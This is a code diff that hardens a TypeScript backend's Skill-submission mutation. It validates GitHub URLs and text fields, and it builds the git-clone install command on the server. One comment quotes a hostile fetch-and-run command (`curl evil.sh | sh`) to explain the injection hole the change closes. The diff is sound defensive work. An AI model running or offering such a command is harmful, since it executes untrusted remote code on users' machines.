@@ -113,13 +113,19 @@ export const categoryCounts = query({
   },
 });
 
+// GitHub repo owner/repo paths: letters, digits, underscore, dot, dash.
+const GITHUB_URL_RE =
+  /^https:\/\/github\.com\/([A-Za-z0-9_.-]+)\/([A-Za-z0-9_.-]+)$/;
+
 export const submit = mutation({
   args: {
     name: v.string(),
     tagline: v.string(),
     description: v.string(),
     githubUrl: v.string(),
-    installCommand: v.string(),
+    // installCommand is server-constructed from the validated githubUrl.
+    // Accepting it from the caller let anyone publish a listing whose
+    // "install" step ran arbitrary shell (e.g. `curl evil.sh | sh`).
     category: v.string(),
     tags: v.array(v.string()),
     pricePoints: v.optional(v.number()),
@@ -130,12 +136,41 @@ export const submit = mutation({
       throw new Error("Sign in to submit a Skill.");
     }
 
+    // Normalize + validate the GitHub URL. Strip trailing `.git` and `/`.
+    const normalizedUrl = args.githubUrl
+      .trim()
+      .replace(/\.git$/, "")
+      .replace(/\/$/, "");
+    if (!GITHUB_URL_RE.test(normalizedUrl)) {
+      throw new Error(
+        "githubUrl must be a https://github.com/<owner>/<repo> URL.",
+      );
+    }
+
+    // Length + presence checks on the text fields the UI also enforces,
+    // so API callers can't bypass them.
+    const name = args.name.trim();
+    if (name.length < 1 || name.length > 60) {
+      throw new Error("Name must be 1–60 characters.");
+    }
+    const tagline = args.tagline.trim();
+    if (tagline.length < 1 || tagline.length > 120) {
+      throw new Error("Tagline must be 1–120 characters.");
+    }
+    const description = args.description.trim();
+    if (description.length < 1) {
+      throw new Error("Description is required.");
+    }
+
     const user = await ctx.db.get(userId);
     if (!user) {
       throw new Error("User record missing.");
     }
 
-    const slug = slugify(args.name);
+    const slug = slugify(name);
+    if (slug.length < 2) {
+      throw new Error("Name must produce a valid slug.");
+    }
     const existing = await ctx.db
       .query("skills")
       .withIndex("by_slug", (q) => q.eq("slug", slug))
@@ -150,15 +185,18 @@ export const submit = mutation({
       "anonymous";
     const avatar = pickAvatar(slug);
 
+    // Build the install command server-side from the validated URL.
+    const installCommand = `git clone ${normalizedUrl} ~/.claude/skills/${slug}`;
+
     const id = await ctx.db.insert("skills", {
       slug,
-      name: args.name,
-      tagline: args.tagline,
-      description: args.description,
+      name,
+      tagline,
+      description,
       category: args.category,
-      tags: args.tags,
-      githubUrl: args.githubUrl,
-      installCommand: args.installCommand,
+      tags: args.tags.slice(0, 5),
+      githubUrl: normalizedUrl,
+      installCommand,
       installs: 0,
       stars: 0,
       rating: 0,
